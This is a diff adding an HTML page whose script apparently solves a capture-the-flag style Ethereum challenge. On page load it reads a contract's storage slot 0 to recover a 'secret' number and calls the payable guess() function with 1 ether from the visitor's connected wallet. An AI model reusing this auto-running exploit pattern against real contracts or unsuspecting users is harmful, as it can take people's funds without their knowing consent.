@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      (async () => {
+        let ethAddr;
+        if (window.ethereum) {
+          window.web3 = new Web3(window.ethereum);
+          let conn = await window.ethereum.enable();
+          if (conn.length > 0) {
+            ethAddr = conn[0];
+          }
+        } else {
+          return;
+        }
+
+        const address = "0xcEa4dEaC034A328fe5d6c872Bbc412dB9aBB7c5F";
+        const hex = await window.web3.eth.getStorageAt(address, 0);
+        const decimal = parseInt(hex, 16);
+
+        const abi = [
+          {
+            constant: false,
+            inputs: [
+              {
+                name: "n",
+                type: "uint8",
+              },
+            ],
+            name: "guess",
+            outputs: [],
+            payable: true,
+            stateMutability: "payable",
+            type: "function",
+          },
+          {
+            constant: true,
+            inputs: [],
+            name: "isComplete",
+            outputs: [
+              {
+                name: "",
+                type: "bool",
+              },
+            ],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [],
+            payable: true,
+            stateMutability: "payable",
+            type: "constructor",
+          },
+        ];
+
+        const contr = new window.web3.eth.Contract(abi, address);
+        contr.methods
+          .guess(decimal)
+          .send({ from: ethAddr, value: Web3.utils.toWei("1") });
+      })();
+    </script>
+  </body>
+</html>
